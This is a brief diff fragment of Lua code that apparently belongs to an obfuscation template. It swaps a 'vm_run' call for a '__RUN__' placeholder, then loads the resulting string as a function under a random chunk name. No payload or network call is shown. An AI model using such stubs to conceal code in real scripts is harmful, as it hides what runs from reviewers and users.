@@ -10,7 +10,7 @@ do
   end
 end
 --@@VM@@
-local sS=vm_run(sP,sK)
+local sS=__RUN__(sP,sK)
 if type(sS)~="string" or #sS<64 then return end
 local sF=sl(sS,"="..string.format("%x",math.random(1,2147483646)))
 if type(sF)~="function" then return end
